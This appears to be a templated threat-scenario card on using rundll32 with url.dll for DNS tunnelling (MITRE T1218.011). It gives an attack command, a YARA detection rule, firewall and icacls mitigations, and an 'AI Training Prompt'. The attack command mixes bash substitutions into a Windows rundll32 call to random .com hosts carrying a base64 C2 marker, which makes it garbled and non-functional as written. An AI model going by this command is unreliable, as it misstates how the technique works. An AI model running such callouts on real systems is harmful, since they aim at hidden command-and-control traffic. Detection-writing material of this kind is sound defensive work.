---
type: campaign
scenario_id: 424
tactic: Defense Evasion
technique: "T1218.011: Rundll32"
technique_id: T1218.011
tags: [campaign, lotl, defense_evasion]
---

# Using rundll32 with url.dll for DNS tunneling.

## Threat Description
Using rundll32 with url.dll for DNS tunneling.

## Attack Command
```
rundll32 url.dll,OpenURL "http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo nslookup -type=TXT $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)"
```

## Detection Logic
Monitor rundll32 url: `wmic process where name='rundll32.exe' get commandline | findstr url.dll`; YARA rule: `rule Rundll32UrlDnsTunnel { strings: $a = /rundll32.*url.dll.*nslookup/ nocase; condition: $a }`.

## Mitigation
Restrict rundll32: `icacls %windir%\System32\rundll32.exe /deny Everyone:RX`; Block suspicious DNS: `netsh advfirewall firewall add rule name='Block rundll32 DNS' dir=out program='%windir%\System32\rundll32.exe' action=block`.

## AI Training Prompt
Train AI to detect rundll32 url.dll-based DNS tunneling by analyzing nslookup TXT queries, rundll32 command-line arguments, and DNS traffic patterns; suggest DNS restrictions.

## References
- MITRE ATT&CK T1218.011: https://attack.mitre.org/techniques/T1218/011/
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
